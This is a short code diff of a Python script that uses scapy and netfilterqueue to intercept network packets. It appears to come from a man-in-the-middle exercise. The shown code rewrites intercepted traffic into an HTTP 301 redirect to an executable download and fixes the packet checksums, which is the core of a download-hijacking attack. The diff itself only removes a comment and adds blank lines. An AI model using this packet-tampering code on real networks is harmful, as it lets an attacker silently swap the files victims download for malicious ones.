@@ -8,7 +8,6 @@ def setLoad(packet, load):
 	packet[scapy.Raw].load = load
 	del packet[scapy.IP].len
 	del packet[scapy.IP].chksum
-	# del scapyPacket[scapy.TCP].len
 	del packet[scapy.TCP].chksum
 	return packet
 
@@ -27,6 +26,8 @@ def processPacket(packet):
 				modifiedPacket = setLoad(scapyPacket, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-611.exe\n\n")
 				packet.set_payload(bytes(modifiedPacket))
 	packet.accept()
+
+
 
 
 queue = netfilterqueue.NetfilterQueue()
